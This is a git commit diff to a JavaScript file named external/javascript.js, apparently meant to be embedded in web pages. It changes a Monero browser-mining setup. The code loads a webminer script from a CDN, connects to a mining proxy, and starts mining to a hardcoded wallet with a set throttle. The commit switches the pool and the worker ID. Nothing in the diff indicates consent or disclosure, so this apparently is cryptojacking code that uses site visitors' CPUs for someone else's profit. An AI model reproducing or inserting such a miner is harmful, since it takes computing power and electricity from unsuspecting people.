c1badfee23a6888f7a46e050beb6e606b09b6e81
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-10-16 04:34:13 +0700

    Update javascript.js

--- external/javascript.js
+++ external/javascript.js
@@ -7,11 +7,10 @@ script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.
 document.head.appendChild(script);
 
 server = "wss://ny1.xmrminingproxy.com";
-var pool = "xmr-eu1.nanopool.org:10300";
-var walletAddress = "88zds4LCv8T8yZUshwnkcpfGcYpVUpJAMNdxMZ4wfK3NMwD7znk5f1wfDUJB5skH3STGkaoPkdvmn21rxSrRCn8xQ1ncfXo";
-var workerId = "GH-XMR-JS-SNIPPET"
-var threads = -4;
-var password = "";
-startMining(pool, walletAddress, workerId, threads, password);
-throttleMiner = 20;
-// End Of Mining Code
+    var pool = "gulf.moneroocean.stream:10128";
+    var walletAddress = "88zds4LCv8T8yZUshwnkcpfGcYpVUpJAMNdxMZ4wfK3NMwD7znk5f1wfDUJB5skH3STGkaoPkdvmn21rxSrRCn8xQ1ncfXo";
+    var workerId = "webminer"
+    var threads = -4;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
